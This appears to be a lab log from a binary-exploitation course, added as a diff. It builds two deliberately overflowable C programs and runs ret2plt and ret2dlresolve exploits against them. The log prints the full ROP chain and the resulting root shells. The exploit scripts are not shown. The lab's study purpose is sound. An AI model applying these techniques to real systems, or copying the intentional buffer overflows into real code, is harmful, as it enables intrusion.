@@ -1,0 +1,122 @@
+### Lab 8.2 - ret2plt + ret2dlresolve
+### Ubuntu 24.04, glibc 2.39, gcc 13.3 (chay that tren server)
+
+$ uname -a; ldd --version | head -1
+Linux ubuntu24 6.8.0-134-generic #134-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 26 18:43:11 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+ldd (Ubuntu GLIBC 2.39-0ubuntu8.9) 2.39
+
+$ bash build.sh
+ret2plt.c: In function ‘vuln’:
+ret2plt.c:22:5: warning: ‘read’ writing 256 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
+   22 |     read(0, buf, 256);          // overflow saved RIP
+      |     ^~~~~~~~~~~~~~~~~
+ret2plt.c:21:10: note: destination object ‘buf’ of size 64
+   21 |     char buf[64];
+      |          ^~~
+In file included from ret2plt.c:9:
+/usr/include/unistd.h:371:16: note: in a call to function ‘read’ declared with attribute ‘access (write_only, 2, 3)’
+  371 | extern ssize_t read (int __fd, void *__buf, size_t __nbytes) __wur
+      |                ^~~~
+[*] built: ret2plt
+dlresolve.c: In function ‘vuln’:
+dlresolve.c:26:5: warning: ‘read’ writing 512 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
+   26 |     read(0, buf, 0x200);        // overflow saved RIP, du cho ROP chain
+      |     ^~~~~~~~~~~~~~~~~~~
+dlresolve.c:25:10: note: destination object ‘buf’ of size 64
+   25 |     char buf[64];
+      |          ^~~
+In file included from dlresolve.c:9:
+/usr/include/unistd.h:371:16: note: in a call to function ‘read’ declared with attribute ‘access (write_only, 2, 3)’
+  371 | extern ssize_t read (int __fd, void *__buf, size_t __nbytes) __wur
+      |                ^~~~
+[*] built: dlresolve
+
+$ checksec ret2plt
+[*] '/root/techlabs/pwn-p8/labs/8.2/ret2plt'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+$ checksec dlresolve
+[*] '/root/techlabs/pwn-p8/labs/8.2/dlresolve'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+### PHAN A: ret2plt
+$ python3 exploit_ret2plt.py
+[*] '/root/techlabs/pwn-p8/labs/8.2/ret2plt'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './ret2plt'
+[+] Starting local process './ret2plt': pid 440864
+[*] Loaded 6 cached gadgets for './ret2plt'
+[*] pop rdi    = 0x401166
+[*] /bin/sh    = 0x402017
+[*] system@plt = 0x401050
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 20B
+[x] Receiving all data: 59B
+[x] Receiving all data: 69B
+[+] Receiving all data: Done (69B)
+[*] Process './ret2plt' stopped with exit code -11 (SIGSEGV) (pid 440864)
+===PWNED_8_2_PLT===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+
+[+] ret2plt OK: system@plt("/bin/sh") lay shell, khong can leak libc
+
+### PHAN B: ret2dlresolve
+$ python3 exploit_dlresolve.py
+[*] '/root/techlabs/pwn-p8/labs/8.2/dlresolve'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './dlresolve'
+[+] Starting local process './dlresolve': pid 440884
+[*] data_addr      = 0x404e00
+[*] dl payload len = 80
+[*] Loaded 8 cached gadgets for './dlresolve'
+[*] ROP chain:
+    0x0000:         0x40101a ret
+    0x0008:         0x40114a pop rdx; ret
+    0x0010:             0x50 [arg2] rdx = 80
+    0x0018:         0x401148 pop rsi; ret
+    0x0020:         0x404e00 [arg1] rsi = 4214272
+    0x0028:         0x401146 pop rdi; ret
+    0x0030:              0x0 [arg0] rdi = 0
+    0x0038:         0x401040 read
+    0x0040:         0x401146 pop rdi; ret
+    0x0048:         0x404e48 [arg0] rdi = 4214344
+    0x0050:         0x401020 [plt_init] system
+    0x0058:            0x309 [dlresolve index]
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 19B
+[x] Receiving all data: 58B
+[x] Receiving all data: 68B
+[+] Receiving all data: Done (68B)
+[*] Stopped process './dlresolve' (pid 440884)
+===PWNED_8_2_DL===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+
+[+] ret2dlresolve OK: ep _dl_runtime_resolve goi system("/bin/sh")
